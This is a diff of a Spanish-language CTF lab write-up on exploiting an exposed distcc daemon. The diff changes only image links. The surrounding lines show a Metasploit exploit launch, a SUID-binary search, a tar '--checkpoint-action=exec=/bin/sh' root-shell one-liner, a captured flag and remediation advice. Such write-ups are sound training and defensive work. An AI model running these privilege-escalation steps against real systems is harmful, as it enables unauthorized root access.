@@ -79,7 +79,7 @@ exploit -j
 
 _(La opción `-j` sirve para que se ejecute como un "job" en segundo plano, permitiéndote seguir usando la consola para lanzar el exploit contra el puerto 3632)._
 
-![[image20260428180134.png]]
+![](image20260428180134.png)
 ---
 ## 4. Análisis y Explotación
 ### Vector de entrada: [[distcc]]
@@ -94,7 +94,7 @@ Explicación de como encontraste el fallo.
 find / -user root -perm /4000 2>/dev/null
 ```
 
-![[image20260428181610.png]]
+![](image20260428181610.png)
 
 ```bash
 tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
@@ -126,7 +126,7 @@ DISTCC{d1str1but3d_c0mp1l4t10n_pwn3d}
 ```
 
 ---
-![[image20260428182603.png]]
+![](image20260428182603.png)
 ## 5. Recomendaciones y Conclusiones
 ### Remediación Técnica
 1. **Restringir el servicio DistCC**: El daemon `distccd` no debe estar expuesto a redes no confiables. Se debe configurar el parámetro `--allow` o `--listen` para limitar las conexiones solo a IPs específicas de confianza.
